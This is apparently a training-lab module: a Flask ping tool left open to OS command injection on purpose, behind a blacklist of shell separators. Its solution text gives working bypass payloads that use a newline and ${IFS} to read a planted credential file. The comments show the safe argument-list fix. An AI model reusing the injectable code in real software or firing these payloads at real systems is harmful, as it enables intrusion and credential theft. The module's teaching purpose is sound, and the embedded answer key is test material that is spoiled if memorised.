"""网络诊断工具的 ping 处 —— 命令注入，但过滤了一堆分隔符。

过滤器列得很认真：空格、制表符、分号、管道、后台执行、反引号、命令替换、
重定向。看起来把常见的都堵上了。

它漏了两件事：

  · **换行在 shell 里跟分号完全等价**，而它没拦。
  · **空格也有替代写法**，`${IFS}` 就是最经典的那个。

（这一题的环境是 Kali，`/bin/sh` 是 dash 不是 bash。所以
 `${IFS:0:1}` 这种变量子串展开和 `{a,b}` 花括号展开在这里都**不可用** ——
 那些是 bash 才有的。writeup 里只写在这个环境里真能跑的东西。）
"""

import re
import subprocess

from vuln4all import Vuln, render_template, request

#: 只有命令执行才读得到的东西。它出现在**命令输出**里 = 真的打穿了。
SENTINEL = "OPS-TOKEN-7f3a91c4"

#: 单条命令最多跑多久、最多回多少输出。
#:
#: 这个模块是真的在跑 shell（这是教学需要的），所以得自己兜住两件事：
#:   · 时长 —— 一条 `sleep 9999` 不能把 worker 占住
#:   · 输出量 —— 一条 `cat /dev/zero` 十秒内就能把内存和磁盘都吃光
MAX_SECONDS = 10
MAX_OUTPUT = 20000

#: 目录名用 ASCII —— 这一题的 payload 要塞进 shell 参数里，
#: 带中文会让 copy-paste 出来的 payload 全是百分号编码，噪音太大。
#: 页面上显示的中文标签另算。
LOG_DIR = "logs"
LOG_FILE = "exec.log"
SECRET_DIR = "private"
SECRET_FILE = "ops-token.txt"

GOAL = "读到内部资料里的凭据（它会出现在执行日志里）"

# ------------------------------------------------------------------ 过滤层
#
# 一份"分隔符黑名单"。它背后的假设是：命令注入得靠分隔符把两条命令接起来。
# 这个假设不算错 —— 但它列的分隔符不全，而且它假设"空格就是空格"。
RULES = [
    ("空格与制表符", r"[ \t]"),
    ("分号",         r";"),
    ("管道与后台",   r"[|&]"),
    ("反引号",       r"`"),
    ("命令替换",     r"\$\("),
    ("重定向",       r"[<>]"),
]

COMPILED = [(name, re.compile(pattern)) for name, pattern in RULES]


def inspect(value):
    for name, pattern in COMPILED:
        if pattern.search(value):
            return name
    return None


class SpaceFilter(Vuln):
    info = {
        "name": "带分隔符过滤的命令注入",
        "author": ["guaidao2"],
        "cwe": "CWE-78",
        "owasp": "A03:2021 - Injection",
        "difficulty": "困难",
        "description": (
            "运维面板的 ping 输入框拼进 shell 命令。前面挂了一份过滤器，"
            "把空格、分号、管道、反引号、命令替换、重定向全列上了。\n"
            "它漏了两件最基础的事 —— 而这两件事刚好让绕过变得很简单。"
        ),
        "hint": (
            "先打一条普通 payload 看过滤器报哪条规则：`127.0.0.1; id`。\n"
            "然后注意：过滤器列了一堆分隔符，但**换行**不在里面。\n"
            "换行在 shell 里算不算分隔符？先试试 `127.0.0.1` 后面直接换行再写命令。\n"
            "接着是空格：过滤器拦了空格和制表符。shell 里有没有"
            "「本身就是一个空白字符」的变量？\n"
            "（提示：IFS 是 Internal Field Separator，它默认就是一个空格、制表符、换行。）"
        ),
        "solution": (
            "一、确认过滤器。`127.0.0.1; id` 会被「分号」那条拦掉。\n\n"
            "二、换行当分隔符。shell 里换行跟 `;` 完全等价，而过滤器没拦它：\n"
            "   127.0.0.1%0Aid\n\n"
            "三、空格用 ${IFS} 替掉。IFS 是 shell 的字段分隔符变量，默认值就是\n"
            "   「空格 + 制表符 + 换行」，所以 ${IFS} 展开出来就是空白：\n"
            "   127.0.0.1%0Ahead${IFS}-c${IFS}20${IFS}/etc/hostname\n\n"
            "四、读这一题的目标文件。它在应用数据目录下：\n"
            "   127.0.0.1%0Ahead${IFS}-c${IFS}200${IFS}<凭据文件的完整路径>\n"
            "   页面下面会显示应用的诊断日志目录，里面有「运维凭据.txt」的完整路径。\n"
            "   读出来之后，凭据那串字符串会一并写进执行日志 —— 这就是通关凭据。\n\n"
            "在这个环境（dash）里同样能跑的替空格写法：\n"
            "  · 真制表符（URL 里 %09）—— 过滤器把 \\t 也拦了，所以这条不行，\n"
            "    但知道「它拦了制表符却没拦换行」本身就是它的破绽\n"
            "  · $(printf${IFS}\"\\040\")         用命令替换生成一个空格\n"
            "  · `printf${IFS}' '`               反引号版（但反引号本身被拦了）\n"
            "  · 通配符省参数：head${IFS}-c${IFS}20${IFS}/etc/host*\n\n"
            "注意这个环境**不能**用的写法（writeup 里特意列出，省得你白试）：\n"
            "  · ${IFS:0:1}       变量子串展开 —— dash 不支持，报 Bad substitution\n"
            "  · {-c,20}          花括号展开 —— dash 不支持\n"
            "  · $'\\x20'         ANSI-C 引号 —— dash 不支持\n"
            "  · head${IFS}\"-c 20\"${IFS}/etc/hostname\n"
            "                     引号里的空格还是空格，拦得到\n\n"
            "这一题的教训：\n"
            "  · 黑名单漏一个字符就等于没防。这里漏的是换行。\n"
            "  · 别假设「空格就是空格」—— shell 里空白字符有一整类。\n"
            "  · 反过来，也别背 payload。先看清楚**这个环境是什么 shell**，\n"
            "    再决定哪些写法可用 —— 上面那三条 bash 专属的写法在白试清单里。"
        ),
        "refs": [
            "https://portswigger.net/web-security/os-command-injection",
            "https://owasp.org/www-community/attacks/Command_Injection",
        ],
    }

    # ------------------------------------------------------------ 生命周期

    def setup(self, ctx):
        (ctx.workspace / LOG_DIR).mkdir(parents=True, exist_ok=True)
        (ctx.workspace / SECRET_DIR).mkdir(parents=True, exist_ok=True)
        (ctx.workspace / SECRET_DIR / SECRET_FILE).write_text(
            "运维账号：opsadmin\n接口令牌：" + SENTINEL + "\n", encoding="utf-8"
        )
        (ctx.workspace / LOG_DIR / LOG_FILE).write_text(
            "网络诊断工具执行记录\n" + "=" * 40 + "\n", encoding="utf-8"
        )

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)
        log_path = ctx.workspace / LOG_DIR / LOG_FILE
        secret_path = ctx.workspace / SECRET_DIR / SECRET_FILE

        def run(command):
            """真的跑一下，但把时长和输出量都夹住。

            外面套的 `{ ... ; } 2>&1 | head -c N` 是有意的：

              · 花括号把整条命令（包括学习者注入的那部分）包成**一组**，
                组的输出全部经过 head 截断 —— 所以吐多少都只占 N 字节内存，
                不会把磁盘写满，也不会把 worker 撑爆
              · 管道断了之后，还在写的那个进程会收到 SIGPIPE 自己退出，
                所以超时被杀时不会留下野进程
            """
            wrapped = "{ %s ; } 2>&1 | head -c %d" % (command, MAX_OUTPUT)
            try:
                done = subprocess.run(
                    wrapped, shell=True, stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT, timeout=MAX_SECONDS,
                )
            except subprocess.TimeoutExpired:
                return "(命令超过 %d 秒，已中止)" % MAX_SECONDS
            text = (done.stdout or b"").decode("utf-8", "replace")
            if len(done.stdout or b"") >= MAX_OUTPUT:
                text += "\n...（输出过长，只留了前 %d 字节）" % MAX_OUTPUT
            return text

        def append_log(text):
            with open(log_path, "a", encoding="utf-8", errors="replace") as handle:
                handle.write(text)

        @app.route("/", methods=["GET", "POST"])
        def index():
            target = "127.0.0.1"
            command = None
            output = None
            blocked = None

            if request.method == "POST":
                target = request.form.get("target", "")

                # ↓↓↓ 过滤层。它拦分隔符，但没拦换行。 ↓↓↓
                blocked = inspect(target)

                if blocked is None:
                    # ↓↓↓ 洞在这里：拼进 shell 命令 ↓↓↓
                    command = "ping -c 1 " + target
                    # ↑↑↑ 正确做法：subprocess.run(["ping", "-c", "1", target]),
                    #     或者至少 shell=False + 参数列表 ↑↑↑
                    output = run(command)
                    append_log(
                        "命令：%s\n输出：\n%s\n%s\n"
                        % (command, output, "-" * 40)
                    )
                    # 判定：凭据那串东西出现在这次输出里 = 真的读到文件了
                    if SENTINEL in output:
                        ctx.progress.mark(GOAL)
                else:
                    append_log("命令：ping -c 1 %s\n结果：被过滤器拦截（%s）\n%s\n"
                               % (target, blocked, "-" * 40))

            return render_template(
                "index.html",
                target=target,
                command=command,
                output=output,
                blocked=blocked,
                rules=[name for name, _ in RULES],
                log_dir=str(ctx.workspace / LOG_DIR),
                secret_path=str(secret_path),
                log_path=str(log_path),
            )

        @app.route("/日志")
        def log():
            text = log_path.read_text(encoding="utf-8", errors="replace")
            return render_template("log.html", text=text, hit=SENTINEL in text)

        @app.route("/重新开始", methods=["POST"])
        def reset_log():
            log_path.write_text(
                "网络诊断工具执行记录\n" + "=" * 40 + "\n", encoding="utf-8"
            )
            return render_template(
                "index.html",
                target="127.0.0.1",
                command=None,
                output=None,
                blocked=None,
                rules=[name for name, _ in RULES],
                log_dir=str(ctx.workspace / LOG_DIR),
                secret_path=str(secret_path),
                log_path=str(log_path),
            )

        return {"": app}

    # ---------------------------------------------------------------- 进度

    def check(self, ctx):
        """从执行日志里推：凭据那串东西有没有被**命令读出来**过。

        用日志而不是另存进度，是因为"运维诊断工具会记录每一次执行"
        本身就是这个业务场景里该有的事 —— 判定的载体是应用本来就有的东西。

        注意只看**输出**那几行，跳过 `命令：` 打头的回显行。
        理由：日志里也记了学习者输入的原样命令，如果判定扫全文，
        那么"把那串凭据本身当参数打进去"就会被误判成通关 ——
        而它恰恰没有读到任何文件。这一条是实测踩出来才加的。
        """
        path = ctx.workspace / LOG_DIR / LOG_FILE
        try:
            text = path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            return {GOAL: False}
        for line in text.splitlines():
            if line.startswith("命令："):
                continue
            if SENTINEL in line:
                return {GOAL: True}
        return {GOAL: False}
